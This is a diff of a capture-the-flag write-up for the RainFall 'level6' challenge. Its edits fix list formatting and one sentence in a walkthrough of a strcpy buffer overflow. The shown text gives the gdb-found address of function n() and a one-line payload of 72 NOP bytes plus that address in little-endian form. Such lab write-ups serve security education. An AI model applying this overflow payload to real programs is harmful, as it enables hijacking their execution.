@@ -5,8 +5,8 @@ The goal is to exploit the vulnerability of `strcpy` , filled the buffer until b
 
 **Process**:  
 >   1. Find the offset
->     2. Get address of `n()`
->    3. Pass payload
+>   2. Get address of `n()`
+>   3. Pass payload
 
 ## Step 1
 
@@ -38,8 +38,7 @@ $2 = (<text variable, no debug info> *) 0x8048454 <n>
 ## Step 3 
 
 ### Step 1 : Load payload
-
-passe the pass as parameter
+the payload it passed  as parameter<br/>
 *The address `0x8048454` it convert in little-endian format `\x54\x84\x04\x08`*
 ```
 level6@RainFall:~$ ./level6 $(python -c 'print "\x90" * 72 + "\x54\x84\x04\x08"')
